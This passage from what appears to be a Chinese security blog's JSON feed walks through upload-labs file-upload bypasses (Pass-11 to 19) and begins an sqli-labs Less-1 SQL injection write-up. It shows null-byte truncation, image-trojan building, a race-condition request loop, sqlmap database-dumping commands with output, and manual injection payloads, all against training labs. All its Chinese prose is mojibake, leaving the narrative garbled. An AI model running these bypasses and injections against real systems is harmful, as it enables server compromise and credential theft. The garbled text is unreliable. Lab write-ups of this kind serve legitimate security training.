mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">&quot;</span><span class=\"mclose\">)</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span></span></span></span>file_ext;</p>\n<p>ç”¨ 00 æˆªæ–­ï¼Œåœ¨è·¯å¾„åé¢åŠ ä¸Š hqxx.php%00</p>\n<p><img src=\"upload-labs-11-01.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-11\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-11\">#</a> æ€»ç»“</h2>\n<p>é€šè¿‡å­—ç¬¦æ‹¼æ¥ï¼Œè¿æ¥è·¯å¾„æ–‡ä»¶åï¼Œåå°å¤„ç†åä¸Šä¼ åˆ° windows æ—¶ï¼Œos çœ‹è§ %00 è‡ªåŠ¨æˆªæ–­</p>\n<p>00 æˆªæ–­çš„å‰ææ¡ä»¶ï¼šPHP ç‰ˆæœ¬å°äº 5.3.4ï¼ŒPHP çš„ magic_quotes_gpc ä¸º OFF çŠ¶æ€</p>\n<p>move_uploaded_file å‡½æ•°çš„åº•å±‚å®ç°ç±»ä¼¼äº C è¯­è¨€ï¼Œé‡åˆ° 0x00 ä¼šæˆªæ–­</p>\n<h1 id=\"pass-12\"><a class=\"markdownIt-Anchor\" href=\"#pass-12\">#</a> Pass-12</h1>\n<h2 id=\"è¿‡ç¨‹-12\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-12\">#</a> è¿‡ç¨‹</h2>\n<p>ä¸Šä¼ æ–‡ä»¶æŠ“åŒ…ï¼Œå‘ç°è·¯å¾„ä¹Ÿåœ¨è¡¨å•ä¸­äº†ï¼Œåœ¨åé¢åŠ ä¸Š /hqxx.php ï¼Œæ³¨æ„åé¢æœ‰ä¸€ä¸ªç©ºæ ¼</p>\n<p><img src=\"upload-labs-12-01.png\" alt=\"\"></p>\n<p>å› ä¸º post è¯·æ±‚æ²¡åŠæ³•è§£æ %00ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ hex ä¸­æ›´æ”¹æ•°æ®åŒ…</p>\n<p>æ‰¾åˆ°å¯¹åº”è¡Œï¼Œä»£è¡¨ç©ºæ ¼çš„ 20ï¼Œæ”¹ä¸º 00</p>\n<p><img src=\"upload-labs-12-02.png\" alt=\"\"></p>\n<p>ä¸Šä¼ æˆåŠŸ</p>\n<p><img src=\"upload-labs-12-03.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-12\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-12\">#</a> æ€»ç»“</h2>\n<p>ä¸ºå•¥ç½‘ä¸Šæœ‰äººè¯´è¿™æ˜¯äºŒè¿›åˆ¶ä»£ç ï¼Œå¯æ˜¯è¿™æ˜æ˜ä¸æ˜¯äºŒè¿›åˆ¶å•Š</p>\n<p>é€šå¸¸ JPEG/JPG: FF D8 , PNG:89 50ï¼ŒGIF:47 49</p>\n<ol>\n<li>JPEG;.JPE;.JPGï¼Œâ€JPGGraphic Fileâ€</li>\n<li>gifï¼Œâ€GIF 89Aâ€</li>\n<li>zipï¼Œâ€Zip Compressedâ€</li>\n<li>doc;.xls;.xlt;.ppt;.aprï¼Œâ€MS Compound Document v1 or Lotus Approach APRfileâ€</li>\n</ol>\n<h1 id=\"pass-13\"><a class=\"markdownIt-Anchor\" href=\"#pass-13\">#</a> Pass-13</h1>\n<h2 id=\"è¿‡ç¨‹-13\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-13\">#</a> è¿‡ç¨‹</h2>\n<p>æºä»£ç ä¸­è¯»å–æ–‡ä»¶å‰ 2 å­—èŠ‚ï¼Œæ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦å±äº jpgã€png æˆ–è€… gif ç±»å‹</p>\n<p>ç±»å‹åˆ¤æ–­æˆåŠŸåï¼Œè¿˜æ›´æ”¹äº†æ–‡ä»¶å</p>\n<p><img src=\"upload-labs-13-01.png\" alt=\"\"></p>\n<p>è¿™é‡Œç”¨æ–‡ä»¶åŒ…å«æ¥è§£æå›¾ç‰‡é©¬</p>\n<p>æ‰‹åŠ¨åœ¨ upload æ–‡ä»¶å¤¹æ·»åŠ ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„ php</p>\n<p><img src=\"upload-labs-13-02.png\" alt=\"\"></p>\n<p>ç„¶åæµè§ˆå™¨è§£æ</p>\n<p><img src=\"upload-labs-13-03.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-13\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-13\">#</a> æ€»ç»“</h2>\n<p>unpack () å‡½æ•°ä»äºŒè¿›åˆ¶å­—ç¬¦ä¸²å¯¹æ•°æ®è¿›è¡Œè§£åŒ…ã€‚</p>\n<p>ä¹Ÿå°±æ˜¯è¯´æœ¬èº«æ²¡æœ‰æ–‡ä»¶åŒ…å«æ¼æ´çš„è¯è¿™ä¸ªå›¾ç‰‡é©¬æ˜¯æ²¡æœ‰åŠæ³•è§£æçš„ï¼Œå”‰</p>\n<h1 id=\"pass-14\"><a class=\"markdownIt-Anchor\" href=\"#pass-14\">#</a> Pass-14</h1>\n<h2 id=\"è¿‡ç¨‹-14\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-14\">#</a> è¿‡ç¨‹</h2>\n<p>çœ‹æºç ï¼Œæ¢äº†ä¸€ç§æ–¹å¼éªŒè¯ç±»å‹</p>\n<p>getimagesize () è¿™ä¸ªå‡½æ•°åŠŸèƒ½ä¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„ 16 è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œå»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚çš„</p>\n<p>æ‰€ä»¥è¿˜æ˜¯ä¼ªé€ ä¸€ä¸ªå¤´éƒ¨ä¿¡æ¯ï¼Œä¸Šä¼ å›¾ç‰‡é©¬</p>\n<p><img src=\"upload-labs-14-01.png\" alt=\"\"></p>\n<p>å›¾ç‰‡é©¬çš„åˆ©ç”¨å¯ä»¥ç»“åˆæ–‡ä»¶åŒ…å«ï¼Œè§£ææ¼æ´ç­‰â€¦ åæ­£å°±æ˜¯è¦æŠŠä»–ç”¨ php è§£æå˜›</p>\n<p>æ¯”å¦‚ï¼Œ<a href=\"https://www.cnblogs.com/renhaoblog/p/12874603.html\">nginx è§£ææ¼æ´</a>ï¼Œå’Œç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“äº§ç”Ÿçš„</p>\n<h2 id=\"æ€»ç»“-14\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-14\">#</a> æ€»ç»“</h2>\n<p><a href=\"https://www.runoob.com/php/php-getimagesize.html\">èœé¸Ÿæ•™ç¨‹</a></p>\n<p>getimagesize () å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚</p>\n<p>å®ä¾‹ 1ï¼šæœ¬åœ°å›¾ç‰‡æ–‡ä»¶</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</span><br><span class=\"line\">echo &quot;å®½åº¦ä¸ºï¼š&quot; . $width;</span><br><span class=\"line\">echo &quot;é«˜åº¦ä¸ºï¼š&quot; . $height;</span><br><span class=\"line\">echo &quot;ç±»å‹ä¸ºï¼š&quot; . $attr;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>ä»¥ä¸Šå®ä¾‹è¾“å‡ºç»“æœä¸ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å®½åº¦ä¸ºï¼š290é«˜åº¦ä¸ºï¼š69ç±»å‹ä¸ºï¼š3å±æ€§ï¼šwidth=&quot;290&quot; height=&quot;69&quot;</span><br></pre></td></tr></table></figure>\n<p>å®ä¾‹ 2ï¼šè¿œç¨‹å›¾ç‰‡æ–‡ä»¶</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php$remote_png_url = &#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&#x27;;$img_data = getimagesize($remote_png_url);print_r($img_data );?&gt;</span><br></pre></td></tr></table></figure>\n<p>ä»¥ä¸Šå®ä¾‹è¾“å‡ºç»“æœä¸ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array(    [0] =&gt; 290    [1] =&gt; 69    [2] =&gt; 3    [3] =&gt; width=&quot;290&quot; height=&quot;69&quot;    [bits] =&gt; 8    [mime] =&gt; image/png)</span><br></pre></td></tr></table></figure>\n<p>è¿”å›ç»“æœè¯´æ˜</p>\n<ul>\n<li>ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼</li>\n<li>ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼</li>\n<li>ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­ 1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 =  BMPï¼Œ7 = TIFF (intel byte order)ï¼Œ8 = TIFF (motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBM</li>\n<li>ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ <image> æ ‡ç­¾</li>\n<li>ç´¢å¼• bits ç»™å‡ºçš„æ˜¯å›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼</li>\n<li>ç´¢å¼• channels ç»™å‡ºçš„æ˜¯å›¾åƒçš„é€šé“å€¼ï¼ŒRGB å›¾åƒé»˜è®¤æ˜¯ 3</li>\n<li>ç´¢å¼• mime ç»™å‡ºçš„æ˜¯å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼š header (â€œContent-type: image/jpegâ€);</li>\n</ul>\n<h1 id=\"pass-15\"><a class=\"markdownIt-Anchor\" href=\"#pass-15\">#</a> Pass-15</h1>\n<h2 id=\"è¿‡ç¨‹-15\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-15\">#</a> è¿‡ç¨‹</h2>\n<p>ä½¿ç”¨ exif_imagetype () æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶</p>\n<p>ç”¨å›¾ç‰‡é©¬è¿›è¡Œç»•è¿‡</p>\n<p><img src=\"upload-labs-15-01.png\" alt=\"\"></p>\n<p>ä½†æ˜¯è¿˜å¾—å¸® php å®‰è£… exif.so æ‰©å±•åº“</p>\n<p><img src=\"upload-labs-15-02.png\" alt=\"\"></p>\n<p>ä¸Šä¼ æˆåŠŸ</p>\n<p><img src=\"upload-labs-15-03.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-15\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-15\">#</a> æ€»ç»“</h2>\n<p>exif_imagetype ( string $filename ) : int <em>exif_imagetype()</em> è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</p>\n<h1 id=\"pass-16\"><a class=\"markdownIt-Anchor\" href=\"#pass-16\">#</a> Pass-16</h1>\n<h2 id=\"è¿‡ç¨‹-16\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-16\">#</a> è¿‡ç¨‹</h2>\n<p>çœ‹æºç ï¼Œåˆ¤æ–­äº†åç¼€ï¼Œç„¶ååˆ©ç”¨ imagecreatefrompng () ç­‰å‡½æ•°åˆ›å»ºå›¾ç‰‡ï¼ŒåŒæ—¶ä¹Ÿåˆ©ç”¨è¿™ä¸ªå‡½æ•°åˆ¤æ–­å›¾ç‰‡ç±»å‹æ˜¯å¦ä¸€è‡´äº†ï¼Œç„¶åå†é‡å‘½åæ–‡ä»¶</p>\n<p>ä¾ç„¶ç”¨å›¾ç‰‡é©¬ç»•è¿‡ï¼Œä½†æ˜¯ç®€å•çš„åœ¨æ–‡ä»¶å‰åŠ å…¥ GIF89a å·²ç»ä¸å¯</p>\n<p>é‚£å°±æŠŠå›¾ç‰‡å’Œæœ¨é©¬åˆåœ¨ä¸€èµ·å­ï¼Œcmd æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy pig.jpg/b +  a.php/a haha.jpg</span><br></pre></td></tr></table></figure>\n<p>å†ä¸Šä¼  haha.jpg</p>\n<p><img src=\"upload-labs-16-01.png\" alt=\"\"></p>\n<p>å¾€ä¸‹ç¿»å¯ä»¥çœ‹åˆ°æœ¨é©¬è¢«æ’åœ¨äº†å›¾ç‰‡çš„ä¸­é—´</p>\n<h2 id=\"æ€»ç»“-16\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-16\">#</a> æ€»ç»“</h2>\n<p>è¿‡è¿‡è¿‡</p>\n<h1 id=\"pass-17\"><a class=\"markdownIt-Anchor\" href=\"#pass-17\">#</a> Pass-17</h1>\n<h2 id=\"è¿‡ç¨‹-17\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-17\">#</a> è¿‡ç¨‹</h2>\n<p>çœ‹æºç ï¼Œæ˜¯å…ˆä¸Šä¼ æ–‡ä»¶ç§»åŠ¨åˆ° upload æ–‡ä»¶å¤¹åï¼Œå†å¯¹åç¼€è¿›è¡Œåˆ¤æ–­ï¼Œåˆ¤æ–­å…è®¸åé‡å‘½åæ–‡ä»¶å†åˆ é™¤åŸæ¥çš„æ–‡ä»¶ï¼Œå¦åˆ™ç›´æ¥åˆ é™¤æ–‡ä»¶</p>\n<p>é‚£å°±ææ–‡ä»¶ç«äº‰ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶å’Œåˆ é™¤æ–‡ä»¶ä¹‹é—´çš„æ—¶é—´ï¼Œè¿›è¡Œè®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶ä¸”é€šè¿‡ä¸Šä¼ çš„æ–‡ä»¶åˆ›å»ºæ–°çš„æœ¨é©¬</p>\n<p>åˆ©ç”¨ py è„šæœ¬ä¸æ–­è®¿é—®ä¸Šä¼ çš„ haha.php</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requestswhile <span class=\"literal\">True</span>:    requests.get(<span class=\"string\">&#x27;http://www.upload-labs.com/upload-labs/upload/haha.php&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://xn--request-fy3l308svi7bxjr.py\">ç„¶åè¿è¡Œ request.py</a></p>\n<p>ç„¶åä¸æ–­ç‚¹å‡»å‘åŒ…</p>\n<p><img src=\"upload-labs-17-02.png\" alt=\"\"></p>\n<p>ä¸Šä¼ æˆåŠŸ</p>\n<p><img src=\"upload-labs-17-01.png\" alt=\"\"></p>\n<p><img src=\"upload-labs-17-03.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-17\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-17\">#</a> æ€»ç»“</h2>\n<p>æŠ„ä½œä¸šçš„æ„Ÿè§‰ï¼Œå”‰</p>\n<h1 id=\"pass-18\"><a class=\"markdownIt-Anchor\" href=\"#pass-18\">#</a> Pass-18</h1>\n<h2 id=\"è¿‡ç¨‹-18\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-18\">#</a> è¿‡ç¨‹</h2>\n<p>æºä»£ç ä¸­ï¼Œå…ˆæ£€æŸ¥äº†åç¼€ï¼Œå¤§å°ç­‰ç­‰ï¼Œå†ä¸Šä¼ ï¼Œå†é‡å‘½å</p>\n<p>å®ƒæ£€æŸ¥åç¼€ç”¨çš„ç™½åå•ï¼Œæ‰€ä»¥è¯•ä¸€ä¸‹æˆªæ–­â•ç«äº‰</p>\n<p>æƒ³æ³•å¾ˆç¾å¥½ï¼Œç°å®å¾ˆéª¨æ„Ÿï¼Œçœ‹æŠ¥é”™ä¿¡æ¯ï¼Œæ˜¯å¡åœ¨æ–‡ä»¶ååç¼€ä¸Šäº†</p>\n<p><img src=\"upload-labs-18-01.png\" alt=\"\"></p>\n<p>æ‰€ä»¥ç›´æ¥å’Œä¹‹å‰ä¸€æ ·ä¸Šä¼ å›¾ç‰‡é©¬å“ˆå“ˆå“ˆ</p>\n<p><img src=\"upload-labs-18-02.png\" alt=\"\"></p>\n<p>å†ç”¨æ–‡ä»¶åŒ…å«ä¹‹ç±»çš„é…åˆâ€¦</p>\n<h2 id=\"æ€»ç»“-18\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-18\">#</a> æ€»ç»“</h2>\n<p>ä¸–ä¸Šæ— éš¾äº‹åªè¦è‚¯æ”¾å¼ƒ</p>\n<p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œä¹Ÿå¯ä»¥å°† php æ–‡ä»¶åç¼€åæ›´æ”¹ä¸º.php.7zï¼Œå› ä¸ºç™½åå•ä¸­å…è®¸ä¸Šä¼ .7z çš„æ–‡ä»¶ï¼Œä½†æ˜¯ apache åˆä¸èƒ½è§£æè¿™ä¸ªæ ¼å¼ï¼Œæ‰€ä»¥ä¼šæŠŠè¯¥æ–‡ä»¶å½“ php çš„æ ¼å¼è§£æ</p>\n<h1 id=\"pass-19\"><a class=\"markdownIt-Anchor\" href=\"#pass-19\">#</a> Pass-19</h1>\n<h2 id=\"è¿‡ç¨‹-19\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-19\">#</a> è¿‡ç¨‹</h2>\n<p>å¯ä»¥è‡ªå®šä¹‰åç§°</p>\n<p>ä¸Šä¼  a.php</p>\n<p>è‡ªå®šä¹‰åç§° haha.php.</p>\n<p>å› ä¸ºç”¨çš„é»‘åå•ï¼Œä¸Šä¼ æˆåŠŸ</p>\n<p><img src=\"upload-labs-19-01.png\" alt=\"\"></p>\n<p>å¤§å°å†™éƒ½èƒ½ç»•å“ˆå“ˆå“ˆ</p>\n<h2 id=\"æ€»ç»“-19\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-19\">#</a> æ€»ç»“</h2>\n<p>å“ˆå“ˆå“ˆ</p>\n",
            "tags": [
                "æ–‡ä»¶ä¸Šä¼ é¶åœº"
            ]
        },
        {
            "id": "http://example.com/2020/11/16/dmx/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "url": "http://example.com/2020/11/16/dmx/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "title": "sqli-labsåŸºç¡€å…³å¡",
            "date_published": "2020-11-16T13:29:27.000Z",
            "content_html": "<h1 id=\"less-1\"><a class=\"markdownIt-Anchor\" href=\"#less-1\">#</a> Less-1</h1>\n<p>date:2020-11-16 21:29:27</p>\n<h2 id=\"è¿‡ç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹\">#</a> è¿‡ç¨‹</h2>\n<p>æ ¹æ®é¢˜ç›®æç¤ºï¼šPlease input the ID as parameter with numeric value ï¼Œæ³¨å…¥ç‚¹ä¸º id</p>\n<h3 id=\"sqlmap\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap\">#</a> sqlmapï¼š</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">çˆ†åº“:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 --dbs --batch</span><br><span class=\"line\">çˆ†è¡¨ï¼š</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security --tables --batch</span><br><span class=\"line\">çˆ†å­—æ®µ:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users --columns --batch</span><br><span class=\"line\">çˆ†å­—æ®µå€¼:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users -C id,password,username --dump --batch</span><br><span class=\"line\"></span><br><span class=\"line\">æ‹¿åˆ°æ•°æ®ï¼Œåˆ«çš„è¡¨åŒç†ï¼š</span><br><span class=\"line\">Database: security</span><br><span class=\"line\">Table: users</span><br><span class=\"line\">[13 entries]</span><br><span class=\"line\">+----+------------+----------+</span><br><span class=\"line\">| id | password   | username |</span><br><span class=\"line\">+----+------------+----------+</span><br><span class=\"line\">| 1  | Dumb       | Dumb     |</span><br><span class=\"line\">| 2  | I-kill-you | Angelina |</span><br><span class=\"line\">| 3  | p@ssword   | Dummy    |</span><br><span class=\"line\">| 4  | crappy     | secure   |</span><br><span class=\"line\">| 5  | stupidity  | stupid   |</span><br><span class=\"line\">| 6  | genious    | superman |</span><br><span class=\"line\">| 7  | mob!le     | batman   |</span><br><span class=\"line\">| 8  | admin      | admin    |</span><br><span class=\"line\">| 9  | admin1     | admin1   |</span><br><span class=\"line\">| 10 | admin2     | admin2   |</span><br><span class=\"line\">| 11 | admin3     | admin3   |</span><br><span class=\"line\">| 12 | dumbo      | dhakkan  |</span><br><span class=\"line\">| 14 | admin4     | admin4   |</span><br><span class=\"line\">+----+------------+----------+</span><br></pre></td></tr></table></figure>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥\">#</a> æ‰‹å·¥æ³¨å…¥ï¼š</h3>\n<p>å…ˆå°å¿ƒç¿¼ç¿¼åœ°è¯•ä¸€ä¸ª id=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1</span><br></pre></td></tr></table></figure>\n<p>å“¦è±ï¼Œæœ‰æ•°æ®å›æ˜¾</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>ç”¨ orderby è¯•ä¸€ä¸‹è¦å‡ ä¸ªå­—æ®µï¼Œä½†æ˜¯å‘ç°éšä¾¿ oderby éƒ½æ˜¯ä¸€æ ·çš„å›æ˜¾â€¦</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=2 order by 110</span><br></pre></td></tr></table></figure>\n<p>ä¸­é—´è¯•äº†å¥½å¤šéƒ½æ²¡æœ‰ç»™å›åº”ï¼ŒåŠ å•å¼•å·æŠ¥é”™çœ‹ä¸€ä¸‹ sql è¯­å¥ï¼Œå…ˆå…¥ä¸ºä¸»ä»¥ä¸ºæ˜¯æ•°å­—å‹çš„äº†ï¼Œæ˜æ˜é¢˜ç›®ä¹Ÿå†™äº†â€¦ è ¢çˆ†äº†ï¼ï¼ï¼</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27;</span><br><span class=\"line\">è¾“å‡ºï¼š</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>orderby è¯•å‡ºæ¥æ˜¯è¦ä¸‰ä¸ªå­—æ®µï¼Œå› ä¸ºè¦é—­åˆåé¢çš„å•å¼•å·å¥½éº»çƒ¦å°±ç›´æ¥ç”¨ #ï¼ˆURL ç¼–ç  %23ï¼‰æ³¨é‡Šäº†åé¢çš„ä»£ç ï¼Œè‡ªå·±æ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27; order by 3 limit 1 %23</span><br><span class=\"line\">è¾“å‡ºï¼š</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27; order by 4 limit 1 %23</span><br><span class=\"line\">è¾“å‡ºï¼š</span><br><span class=\"line\">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<p>ä¸‰ä¸ªå­—æ®µï¼Œåªè¾“å‡ºäº†ä¸¤ä¸ªå€¼ï¼Œç†æ‰€å½“ç„¶æœ‰ä¸€ä¸ª id å•¦ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå­—æ®µéšä¾¿æï¼Œåé¢ä¸¤ä¸ªå­—æ®µç”¨äº†è¾“å‡ºæˆ‘ä»¬è¦çš„æ•°æ®ï¼Œä¸€å¥—æµç¨‹èµ°</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span 